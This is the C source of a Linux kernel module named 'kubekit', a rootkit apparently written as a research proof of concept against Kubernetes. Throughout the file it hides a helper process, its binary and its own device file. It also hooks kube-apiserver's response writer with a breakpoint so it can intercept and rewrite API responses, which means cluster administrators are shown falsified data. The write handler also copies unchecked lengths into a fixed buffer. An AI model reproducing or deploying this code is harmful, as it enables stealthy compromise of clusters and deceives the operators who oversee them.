#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/wait.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>

#include "main.h"
#include "kubekit.h"

MODULE_LICENSE("GPL");

static struct cdev cdev;
static struct class *class;
static struct device *device;
dev_t kube_dev_num;

DECLARE_WAIT_QUEUE_HEAD(wq);

struct task_struct *json_handler_ts = NULL;
static bool json_handler_waiting = false;
struct json_resp *json_resp = NULL;

ssize_t user_read(struct file *f, char __user *buf, size_t len, loff_t *off);
ssize_t user_write(
    struct file *f,
    const char __user *buf,
    size_t len,
    loff_t *off
);

static struct file_operations kube_fops = {
    .owner = THIS_MODULE,
    .read = user_read,
    .write = user_write,
};

int init_dev_file(const char *filename) {
    if (alloc_chrdev_region(&kube_dev_num, 0, 1, filename) < 0) {
        return -1;
    }

    cdev_init(&cdev, &kube_fops);
    if (cdev_add(&cdev, kube_dev_num, 1) < 0) {
        unregister_chrdev_region(kube_dev_num, 1);
        return -1;
    }

    class = class_create(THIS_MODULE, filename);
    if (IS_ERR(class)) {
        cdev_del(&cdev);
        unregister_chrdev_region(kube_dev_num, 1);
        return -1;
    }

    device = device_create(class, NULL, kube_dev_num, NULL, filename);
    if (IS_ERR(device)) {
        class_destroy(class);
        cdev_del(&cdev);
        unregister_chrdev_region(kube_dev_num, 1);
        return -1;
    }

    return 0;
}

void remove_dev_file(void) {
    device_destroy(class, kube_dev_num);
    class_destroy(class);
    cdev_del(&cdev);
    unregister_chrdev_region(kube_dev_num, 1);
}

ssize_t user_read(struct file *f,
                  char __user *buf,
                  size_t len,
                  loff_t *off) {
    ssize_t ret;

    if (json_resp == NULL) {
        json_resp = kzalloc(JSON_BUF_SIZE + sizeof(*json_resp), GFP_KERNEL);
        if (json_resp == NULL) {
            return -1;
        }

        json_resp->max_size = JSON_BUF_SIZE;
    }

    json_handler_waiting = true;
    wake_up_interruptible(&wq);

    wait_event_interruptible(wq, json_resp->size != 0);

    ret = copy_to_user(buf, json_resp->buf, json_resp->size + 1);
    return json_resp->size + 1 - ret;
}

ssize_t user_write(struct file *f,
                   const char __user *buf,
                   size_t len,
                   loff_t *off) {
    ssize_t ret;
    size_t size;

    ret = copy_from_user((char *)json_resp->buf, buf, len);
    ret = len - ret;
    if (ret != len) {
        json_resp->new_size = 0;
        goto wakeup_probe;
    }

    size = strlen(json_resp->buf);
    if (size != json_resp->size) {
        json_resp->new_size = size;
    }

wakeup_probe:
    json_resp->done = true;
    json_resp->size = 0;
    wake_up_interruptible(&wq);
    return ret;
}

void kube_write_handler(struct pt_regs *regs) {
    size_t size;
    size_t cap;

    if (json_resp == NULL) {
        return;
    }

    cap = (size_t)regs->di;
    if (cap > json_resp->max_size) {
        return;
    }

    if (copy_from_user((char *)json_resp->buf, (char *)regs->bx, cap) != 0) {
        return;
    }

    size = strlen(json_resp->buf);

    wait_event_interruptible(wq, json_handler_waiting == true);
    json_handler_waiting = false;

    json_resp->size = size;
    wake_up_interruptible(&wq);
    wait_event_interruptible(wq, json_resp->done == true);
    json_resp->done = false;

    if (json_resp->new_size != 0 && json_resp->new_size < cap) {
        if (copy_to_user(
            (char *)regs->bx,
            json_resp->buf,
            json_resp->new_size
        ) != 0) {
            return;
        }

        regs->cx = json_resp->new_size;
    }
}

int kubekit_init(void) {
    int ret;
    off_t func_off;
    struct task_struct *p;
    char *buf, *full_path, *filename;

    init_waitqueue_head(&wq);

    buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (buf == NULL) {
        return -1;
    }

    // try to hide json_handler process and file
    for_each_process(p) {
        full_path = get_path_from_task_struct(p, buf);
        if (full_path == NULL) {
            continue;
        }

        filename = extract_filename_from_full_path(full_path);
        if (strcmp(filename, JSON_HANDLER_BIN) == 0) {
            json_handler_ts = p;

            if (hide_file(full_path) != 0) {
                kfree(buf);
                kfree(json_resp);
                return -1;
            }
            hide_proc(p->pid);
            break;
        }
    }

    kfree(buf);

    // we haven't found json_handler process, stop
    if (json_handler_ts == NULL) {
        kfree(json_resp);
        return -1;
    }

    if (hide_file("/dev/" KUBE_JSON_FNAME) != 0) {
        kfree(json_resp);
        return -1;
    }

    ret = init_dev_file(KUBE_JSON_FNAME);
    if (ret != 0) {
        kfree(json_resp);
        return -1;
    }

    ret = kubekit_do_init();
    if (ret != 0) {
        remove_dev_file();
        kfree(json_resp);
        return -1;
    }

    func_off = kubekit_find_offset(
        "/work/sysdig/kubekit/kube_v1.27.4/kubernetes-1.27.4/cmd/kube-apiserver/apiserver",
        "k8s.io/apiserver/pkg/endpoints/handlers/responsewriters.(*deferredResponseWriter).Write",
        false
    );
    if (func_off > 0) {
        func_off -= 0x0000000000400000;

        ret = kubekit_add_bp(
            "kube-apiserver",
            func_off,
            FUNC_START,
            kube_write_handler,
            KKFL_PROC
        );
        if (ret == 0) {
            kubekit_log("Added the breakpoint!\n");
        }
    }

    ret = kubekit_start();
    if (ret < 0) {
        kubekit_log("Something went wrong while writing the breakpoints\n");
    } else {
        kubekit_log("Initialized!\n");
    }

    return 0;
}

void kubekit_exit(void) {
    // stop json_handler userland process
    send_sig(SIGTERM, json_handler_ts, 0);
    if (json_resp != NULL) {
        json_resp->done = true;
        wake_up_interruptible(&wq);

        kfree(json_resp);
    }

    remove_dev_file();
    kubekit_cleanup();
}

module_init(kubekit_init);
module_exit(kubekit_exit);
